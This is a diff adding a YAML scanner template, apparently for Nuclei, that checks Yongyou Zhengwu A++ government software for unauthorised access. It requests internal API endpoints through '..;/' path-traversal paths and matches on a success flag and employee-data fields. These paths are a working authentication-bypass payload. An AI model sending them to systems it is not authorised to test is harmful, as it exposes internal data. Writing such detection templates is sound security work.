@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-zhengwu-unauthorized-access
+
+info:
+  name: 用友政务A++ 未授权访问漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    用友政务A++ 未授权访问漏洞, identifies unauthorized access vulnerabilities in Yongyou Zhengwu A++.
+
+variables:
+  paths:
+    - pub/fe/config/..;/..;/..;/ma/asval/getAll
+    - pub/fe/config/..;/..;/..;/ga/riskClassify/getClassifyTree
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{paths}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"flag":"success"'
+          - "VS_MA_EMP_CAREER_TYPE"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "application/json"
